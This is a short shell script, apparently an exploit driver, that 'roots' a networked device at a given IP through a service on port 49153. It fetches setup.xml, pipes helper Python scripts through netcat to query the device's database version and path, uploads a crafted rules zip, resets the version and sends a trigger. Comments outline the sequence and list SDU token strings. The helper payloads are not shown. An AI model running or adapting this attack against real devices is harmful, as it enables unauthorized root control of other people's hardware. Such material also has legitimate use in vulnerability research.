 if [ -z "$1" ]; then
	echo "Enter an IP address."
	exit 1
fi

IP=$1
echo "Rooting ${IP}..."

echo "Setting device state"
curl -s http://${IP}:49153/setup.xml > /dev/null
#curl -s http://${IP}:49153/deviceinfoservice.xml > /dev/null
python getinfo.py | nc ${IP} 49153 > /dev/null

python getdbversion.py | nc ${IP} 49153 > dbversion_response
python parse_response.py 'dbversion_response'

python getdbpath.py | nc ${IP} 49153 > dbpath_response
python parse_response.py 'dbpath_response' 	

echo "Sending rules file"
python postfile.py $(cat dbpath) 'path.zip'

python setdbversion.py $(cat dbversion) | nc ${IP} 49153 > /dev/null
echo "Waiting for rules to update"
sleep 10
echo "Sending trigger"
python trigger.py | nc ${IP} 49153 > /dev/null

# TODO:
# setup.xml -> getdbpath -> getdbversion -> post db.zip -> setdbversion
# SDU 13841a67af3a0fa:+oigwKjZZowh8TyPFJVyrmtFFdc=:1528905619
# SDU 13841a67af3a0fa:J4JGWY+xJ08RjReNz55hOvySXwg=:1528906364
# SDU 13841a67af3a0fa:RGYWPxb/AgDGo5EV19myuN2eyY0=:1528906725
